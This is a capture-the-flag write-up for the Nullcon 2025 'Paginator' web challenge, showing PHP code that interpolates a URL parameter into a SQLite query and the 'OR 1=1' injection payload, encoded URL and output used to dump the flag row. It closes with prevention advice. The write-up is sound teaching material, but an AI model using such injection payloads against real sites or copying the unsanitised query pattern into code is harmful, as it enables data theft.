---
title: "Paginator - Nullcon Goa HackIM 2025 CTF"
category: "web"
subcategory: "sqli"
type: "writeup"
tags: ["web", "sqli", "base64", "sqlite", "paginator", "nullcon-goa-hackim-2025-ctf", "2025", "ctf-writeup"]
summary: "SPECT3RR  / Writeups-of-CTFs-  Public"
source:
  name: "CTFtime writeup #39842"
  url: "https://ctftime.org/writeup/39842"
original_source: "https://github.com/SPECT3R0/Writeups-of-CTFs-/wiki/NULLCON:-Paginator-(WEB)"
ctf:
  name: "Nullcon Goa HackIM 2025 CTF"
  year: 2025
  challenge: "Paginator"
---

## Metadata

- **CTF:** Nullcon Goa HackIM 2025 CTF
- **Task:** Paginator
- **Author team:** ODYNSEC
- **CTFtime tags:** web, sqli
- **CTFtime:** <https://ctftime.org/writeup/39842>
- **Original writeup:** <https://github.com/SPECT3R0/Writeups-of-CTFs-/wiki/NULLCON:-Paginator-(WEB)>

---
[ SPECT3RR ](https://github.com/SPECT3RR) / **[Writeups-of-CTFs-](https://github.com/SPECT3RR/Writeups-of-CTFs-) ** Public

  * [ Notifications ](https://github.com/login?return_to=%2FSPECT3RR%2FWriteups-of-CTFs-) You must be signed in to change notification settings
  * [ Fork 0 ](https://github.com/login?return_to=%2FSPECT3RR%2FWriteups-of-CTFs-)
  * [ Star  2 ](https://github.com/login?return_to=%2FSPECT3RR%2FWriteups-of-CTFs-)


# NULLCON: Paginator (WEB)

Jump to bottom

Junaid Arshad Malik edited this page Feb 2, 2025 · [1 revision](https://github.com/SPECT3RR/Writeups-of-CTFs-/wiki/NULLCON:-Paginator-\(WEB\)/_history)

# Paginator 1 Write-up

## Challenge Overview

The challenge is a **web application** that displays **paginated content** from a SQLite database. The objective is to exploit a **SQL injection** vulnerability to retrieve the **flag** , which is stored in a table called `pages`.

## Key Features

  * The application uses a **SQLite database**.
  * The flag is stored in the `pages` table in a row with the **title "Flag"**.
  * The application is vulnerable to **SQL injection** via the `p` parameter in the URL.


## Vulnerability Analysis

The application processes the `p` parameter from the URL, which specifies the range of pages to display. The values are **directly interpolated** into an SQL query **without sanitization** , making the application vulnerable to SQL injection.

### 🔍 **Vulnerable Code**

```
    if(isset($_GET['p']) && str_contains($_GET['p'], ",")) {
      [$min, $max] = explode(",",$_GET['p']);
      if(intval($min) <= 1 ) {
        die("This post is not accessible...");
      }
      try {
        $q = "SELECT * FROM pages WHERE id >= $min AND id <= $max";
        $result = $db->query($q);
        while ($row = $result->fetchArray(SQLITE3_ASSOC)) {
          echo $row['title'] . " (ID=". $row['id'] . ") has content: \"" . $row['content'] . "\"<br>";
        }
      }catch(Exception $e) {
        echo "Try harder!";
      }
    }
```

### ⚠ **Key Points**

  * The `p` parameter is split into `min` and `max` values.
  * The **min value must be greater than 1** (`intval($min) <= 1` causes termination).
  * The SQL query is constructed as: 
[code]SELECT * FROM pages WHERE id >= $min AND id <= $max
```

  * The **flag is stored in the`pages` table** with the **title "Flag"**.


## 🛠 **Exploitation Steps**

### **Step 1: Identify the SQL Injection Point**

The `p` parameter is vulnerable to SQL injection. We can manipulate the `min` and `max` values to inject SQL code.

### **Step 2: Craft the Payload**

To retrieve the flag, we need to:

  * **Bypass the`min <= 1` check**.
  * **Include the "Flag" row in the results**.


A suitable payload:

```
    2,10 OR 1=1
```

This modifies the query to:

```
    SELECT * FROM pages WHERE id >= 2 AND id <= 10 OR 1=1
```

The **`OR 1=1` condition ensures all rows** from the `pages` table are returned.

### **Step 3: URL Encoding**

Since this is a **GET request** , the payload needs **URL encoding** :

```
    2,10%20OR%201=1
```

### **Step 4: Execute the Payload**

Visit the following **URL** :

```
    http://<target-domain>/?p=2,10%20OR%201=1
```

## 🎯 **Expected Output**

Executing the payload should return **all rows** , including the **Flag row** :

```
    Flag (ID=1) has content: "base64-encoded-flag"
    Page 1 (ID=2) has content: "This is not a flag, but just a boring page."
    Page 2 (ID=3) has content: "This is not a flag, but just a boring page."
    ...
```

### **Step 5: Decoding the Flag**

The flag content is **base64-encoded**. To decode it, run:

```
    echo "base64-encoded-flag" | base64 --decode
```

## ✅ **Solution Summary**

  * Exploited **SQL injection** in the `p` parameter.
  * Used the payload: `2,10 OR 1=1`.
  * Retrieved the flag from the `pages` table.
  * Decoded the **base64-encoded flag**.


## 🔐 **Prevention Measures**

To prevent **SQL injection** , always: ✅ **Use prepared statements** with parameterized queries. ✅ **Validate and sanitize user input** before using it in queries. ✅ **Avoid directly interpolating user input** into SQL queries.

## 🏁 **Conclusion**

This challenge demonstrates:

  * The **risks of improper input handling** in SQL queries.
  * How **SQL injection** can be leveraged to retrieve **sensitive data**.
  * The importance of **sanitizing user input** to prevent attacks.


Always ensure **proper security measures** to mitigate such vulnerabilities! 🔥

* * *

**Author: SPECT3R**  
**Event: NullCon CTF**

### Clone this wiki locally
